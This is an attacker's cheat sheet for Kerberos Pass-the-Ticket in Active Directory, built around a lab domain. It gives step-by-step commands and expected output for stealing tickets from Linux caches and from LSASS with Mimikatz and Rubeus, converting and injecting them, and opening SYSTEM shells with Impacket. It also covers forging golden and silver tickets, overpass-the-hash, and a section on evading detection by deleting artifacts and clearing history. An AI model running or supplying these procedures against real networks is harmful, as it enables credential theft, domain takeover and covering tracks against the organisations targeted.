# Kerberos Ticket Reuse - Pass the Ticket (PtT)

## Pass The Ticket (PTT)

### Overview

**Pass The Ticket (PTT)** is a post-exploitation technique where attackers steal Kerberos tickets instead of passwords or hashes. These stolen tickets are injected into the current session to impersonate users and access network resources without needing credentials. PTT is particularly effective in Active Directory environments where Kerberos authentication is used.

**Key Concepts:**

* **Kerberos Tickets** - Authentication tokens issued by domain controllers
* **TGT (Ticket Granting Ticket)** - Used to request service tickets
* **Service Tickets** - Grant access to specific services (SMB, HTTP, SQL)
* **ccache** - Kerberos credential cache format (Linux)
* **kirbi** - Kerberos ticket format (Windows/Mimikatz)
* **Ticket Injection** - Loading stolen tickets into memory

**Attack Requirements:**

* Access to Kerberos ticket cache files
* Administrative/root access to harvest tickets
* Valid tickets not yet expired
* Network access to target services

**Common Sources:**

* `/tmp/krb5cc_*` files on Linux
* LSASS memory on Windows
* User credential caches
* Service account memory

***

### Exploitation Workflow Summary

1. Ticket Harvesting ├─ Identify ticket locations ├─ Extract tickets from memory/disk ├─ Verify ticket validity └─ Note ticket expiration times
2. Ticket Conversion (if needed) ├─ Convert ccache to kirbi ├─ Convert kirbi to ccache └─ Prepare for target platform
3. Ticket Injection ├─ Load ticket into memory ├─ Verify ticket loaded correctly └─ Test authentication
4. Exploitation ├─ Access target services ├─ Execute commands ├─ Pivot to other systems └─ Maintain access

***

### Harvesting Tickets from Linux

#### Locate Kerberos Ticket Caches

**Find ccache files:**

```bash
ls -la /tmp/krb5cc_*
```

**Expected output:**

```
-rw------- 1 user user 1234 Dec 20 10:00 /tmp/krb5cc_1000
-rw------- 1 root root 2345 Dec 20 09:30 /tmp/krb5cc_0
```

**Alternative locations:**

```bash
find / -name "*krb5cc*" 2>/dev/null
find / -name "*.ccache" 2>/dev/null
```

**Check current ticket cache:**

```bash
echo $KRB5CCNAME
klist
```

**Expected output:**

```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: user@DOMAIN.LOCAL

Valid starting     Expires            Service principal
12/20/25 10:00:00  12/20/25 20:00:00  krbtgt/DOMAIN.LOCAL@DOMAIN.LOCAL
12/20/25 10:05:00  12/20/25 20:00:00  cifs/fileserver.domain.local@DOMAIN.LOCAL
```

#### Copy Tickets

**As root:**

```bash
cp /tmp/krb5cc_1000 /root/stolen_ticket.ccache
```

**Using Impacket:**

```bash
# Export tickets from keytab
export KRB5_KTNAME=/etc/krb5.keytab
klist -k
```

***

### Harvesting Tickets from Windows

#### Using Mimikatz

**List available tickets:**

```cmd
mimikatz.exe "sekurlsa::tickets"
```

**Expected output:**

```
Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : LABWWS02$
Domain            : JURASSIC
Logon Server      : LAB-WDC01
Logon Time        : 12/20/2025 10:00:00 AM

 * Username : administrator
 * Domain   : JURASSIC.PARK
 * Password : (null)

Group 0 - Ticket Granting Service
 [00000000]
   Start/End/MaxRenew: 12/20/2025 10:00:00 AM ; 12/20/2025 8:00:00 PM ; 12/27/2025 10:00:00 AM
   Service Name (02) : krbtgt ; JURASSIC.PARK ; @ JURASSIC.PARK
   Target Name  (02) : krbtgt ; JURASSIC.PARK ; @ JURASSIC.PARK
```

**Export specific ticket:**

```cmd
mimikatz.exe "sekurlsa::tickets /export"
```

**Expected result:**

```
 * Saved to file [0;28419fe]-2-1-40e00000-administrator@krbtgt-JURASSIC.PARK.kirbi
```

**Export all tickets:**

```cmd
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

#### Using Rubeus

**List tickets:**

```cmd
Rubeus.exe triage
```

**Expected output:**

```
 ----------------------------------------------------------------------------------------------------------------
 | LUID     | UserName                    | Service                                  | EndTime              |
 ----------------------------------------------------------------------------------------------------------------
 | 0x3e7    | administrator@JURASSIC.PARK | krbtgt/JURASSIC.PARK                     | 12/20/2025 8:00:00 PM |
 | 0x3e4    | LABWWS02$@JURASSIC.PARK     | krbtgt/JURASSIC.PARK                     | 12/20/2025 8:00:00 PM |
 ----------------------------------------------------------------------------------------------------------------
```

**Dump specific ticket:**

```cmd
Rubeus.exe dump /luid:0x3e7 /service:krbtgt
```

**Dump all tickets:**

```cmd
Rubeus.exe dump /nowrap
```

**Expected output:**

```
[*] Action: Dump Kerberos Ticket Data (All Users)

[*] Target LUID     : 0x3e7
[*] Target service  : krbtgt
[*] Ticket          : doIFuj...base64...
```

***

### Ticket Conversion

#### Convert Between Formats

**ccache to kirbi (Linux to Windows):**

```bash
python ticket_converter.py user.ccache user.kirbi
```

**Expected output:**

```
Converting ccache => kirbi
Conversion successful: user.kirbi
```

**kirbi to ccache (Windows to Linux):**

```bash
python ticket_converter.py user.kirbi user.ccache
```

**Expected output:**

```
Converting kirbi => ccache
Conversion successful: user.ccache
```

**Using Impacket's ticketConverter:**

```bash
ticketConverter.py user.kirbi user.ccache
ticketConverter.py user.ccache user.kirbi
```

**Using Kekeo (Windows):**

```cmd
kekeo.exe "misc::convert ccache ticket.kirbi" "exit"
```

***

### Pass The Ticket on Linux

#### Set Ticket Cache

**Export ticket path:**

```bash
export KRB5CCNAME=/root/stolen_ticket.ccache
```

**Verify ticket loaded:**

```bash
klist
```

**Expected output:**

```
Ticket cache: FILE:/root/stolen_ticket.ccache
Default principal: administrator@JURASSIC.PARK

Valid starting     Expires            Service principal
12/20/25 10:00:00  12/20/25 20:00:00  krbtgt/JURASSIC.PARK@JURASSIC.PARK
```

#### Use Ticket with Impacket

**PSExec:**

```bash
python psexec.py jurassic.park/administrator@labwws02.jurassic.park -k -no-pass
```

**Parameters:**

* `-k` - Use Kerberos authentication
* `-no-pass` - Don't prompt for password

**Expected result:**

```
[*] Requesting shares on labwws02.jurassic.park.....
[*] Found writable share ADMIN$
[*] Uploading file pKwLNxOH.exe
[*] Opening SVCManager on labwws02.jurassic.park.....
[*] Creating service RvzY on labwws02.jurassic.park.....
[*] Starting service RvzY.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

**WMIExec:**

```bash
python wmiexec.py jurassic.park/administrator@labwws02.jurassic.park -k -no-pass
```

**SMBExec:**

```bash
python smbexec.py jurassic.park/administrator@lab-wdc01.jurassic.park -k -no-pass
```

**GetST (request service ticket):**

```bash
python getST.py jurassic.park/administrator -k -no-pass -spn cifs/labwws02.jurassic.park
```

***

### Pass The Ticket on Windows

#### Using Mimikatz

**Inject ticket into memory:**

```cmd
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-administrator@krbtgt-JURASSIC.PARK.kirbi"
```

**Expected output:**

```
Ticket: [0;28419fe]-2-1-40e00000-administrator@krbtgt-JURASSIC.PARK.kirbi
 * Injecting ticket
   >> Ticket successfully imported!
```

**Full command sequence:**

```cmd
mimikatz.exe "privilege::debug" "kerberos::ptt ticket.kirbi" "exit"
```

**Verify ticket loaded:**

```cmd
klist
```

**Expected output:**

```
Current LogonId is 0:0x3e7

Cached Tickets: (1)

#0>     Client: administrator @ JURASSIC.PARK
        Server: krbtgt/JURASSIC.PARK @ JURASSIC.PARK
        KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
        Ticket Flags 0x40e00000 -> forwardable renewable initial pre_authent
        Start Time: 12/20/2025 10:00:00 (local)
        End Time:   12/20/2025 20:00:00 (local)
        Renew Time: 12/27/2025 10:00:00 (local)
```

#### Using Rubeus

**Inject ticket:**

```cmd
Rubeus.exe ptt /ticket:[0;28419fe]-2-1-40e00000-administrator@krbtgt-JURASSIC.PARK.kirbi
```

**Expected output:**

```
 ______        _
(_____ \      | |
 _____) )_   _| |__  _____ _   _  ___
|  __  /| | | |  _ \| ___ | | | |/___)
| |  \ \| |_| | |_) ) ____| |_| |___ |
|_|   |_|____/|____/|_____)____/(___/

v2.0.0

[*] Action: Import Ticket
[+] Ticket successfully imported!
```

**Inject base64 ticket:**

```cmd
Rubeus.exe ptt /ticket:doIFuj...base64...
```

**Purge existing tickets first:**

```cmd
Rubeus.exe purge
Rubeus.exe ptt /ticket:ticket.kirbi
```

#### Access Resources

**After injecting ticket:**

**Access file share:**

```cmd
dir \\lab-wdc01.jurassic.park\C$
```

**Execute remote commands:**

```cmd
PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

**Expected result:**

```
PsExec v2.34 - Execute processes remotely
Copyright (C) 2001-2021 Mark Russinovich

Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
jurassic\administrator
```

**Access MSSQL:**

```cmd
sqlcmd -S db01.jurassic.park -Q "SELECT @@version"
```

**Access WinRM:**

```powershell
Enter-PSSession -ComputerName lab-wdc01.jurassic.park
```

***

### Advanced Techniques

#### Golden Ticket Attack

**After dumping krbtgt hash:**

```bash
# Generate golden ticket
python ticketer.py -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain jurassic.park administrator

# Use golden ticket
export KRB5CCNAME=administrator.ccache
python psexec.py jurassic.park/administrator@dc01.jurassic.park -k -no-pass
```

#### Silver Ticket Attack

**For specific service:**

```bash
# Generate silver ticket for CIFS
python ticketer.py -nthash <service_hash> -domain-sid <domain_sid> -domain jurassic.park -spn cifs/labwws02.jurassic.park administrator

# Use silver ticket
export KRB5CCNAME=administrator.ccache
python smbexec.py jurassic.park/administrator@labwws02.jurassic.park -k -no-pass
```

#### Overpass The Hash

**Convert NTLM to Kerberos ticket:**

```cmd
# Using Rubeus
Rubeus.exe asktgt /user:administrator /rc4:<ntlm_hash> /domain:jurassic.park /ptt

# Using Mimikatz
mimikatz.exe "sekurlsa::pth /user:administrator /domain:jurassic.park /ntlm:<hash> /run:cmd.exe"
```

#### Ticket Renewal

**Renew TGT before expiration:**

```bash
# Using Impacket
python renewticket.py -ts jurassic.park/administrator

# Using kinit
kinit -R administrator@JURASSIC.PARK
```

***

### Ticket Properties Analysis

#### Examine Ticket Details

**Linux:**

```bash
klist -e
```

**Expected output:**

```
Ticket cache: FILE:/tmp/krb5cc_1000
Default principal: administrator@JURASSIC.PARK

Valid starting     Expires            Service principal
12/20/25 10:00:00  12/20/25 20:00:00  krbtgt/JURASSIC.PARK@JURASSIC.PARK
        renew until 12/27/25 10:00:00, Etype (skey, tkt): aes256-cts-hmac-sha1-96, aes256-cts-hmac-sha1-96
```

**Windows:**

```cmd
klist tickets
```

**Check ticket flags:**

```
Ticket Flags:
- forwardable (0x40000000)
- renewable (0x00800000)
- initial (0x00400000)
- pre-authenticated (0x00200000)
```

***

### Detection Evasion

#### Clean Artifacts

**Linux:**

```bash
# Remove ticket cache
rm /tmp/krb5cc_*
unset KRB5CCNAME

# Clear command history
history -c
```

**Windows:**

```cmd
# Purge tickets
klist purge

# Remove exported tickets
del *.kirbi
```

#### Ticket Validation Period

**Check ticket expiration:**

```bash
klist | grep "Expires"
```

**Expected output:**

```
12/20/25 10:00:00  12/20/25 20:00:00
```

**Renew before expiration:**

```bash
kinit -R
```

***

### Troubleshooting

#### Ticket Not Working

**Problem:** Ticket imported but authentication fails

**Solution:**

```bash
# Verify ticket validity
klist

# Check time synchronization
timedatectl status

# Sync with DC
ntpdate dc01.jurassic.park

# Verify DNS resolution
nslookup dc01.jurassic.park
```

#### Encryption Type Mismatch

**Problem:** Ticket uses unsupported encryption

**Solution:**

```bash
# Check supported encryption types
cat /etc/krb5.conf | grep default_tgs_enctypes

# Request specific encryption
kinit -e aes256-cts administrator@JURASSIC.PARK
```

#### Clock Skew Error

**Problem:** "KRB\_AP\_ERR\_SKEW" error

**Solution:**

```bash
# Check time difference
date
# Should be within 5 minutes of DC

# Sync time
sudo ntpdate dc01.jurassic.park
```

***

### Quick Reference

**Linux Harvesting:**

```bash
ls -la /tmp/krb5cc_*
cp /tmp/krb5cc_1000 /root/ticket.ccache
```

**Windows Harvesting:**

```cmd
mimikatz.exe "sekurlsa::tickets /export"
Rubeus.exe dump /nowrap
```

**Conversion:**

```bash
python ticket_converter.py ticket.ccache ticket.kirbi
python ticket_converter.py ticket.kirbi ticket.ccache
```

**Linux PTT:**

```bash
export KRB5CCNAME=/root/ticket.ccache
python psexec.py domain/user@target -k -no-pass
```

**Windows PTT:**

```cmd
mimikatz.exe "kerberos::ptt ticket.kirbi"
Rubeus.exe ptt /ticket:ticket.kirbi
PsExec.exe \\target cmd
```
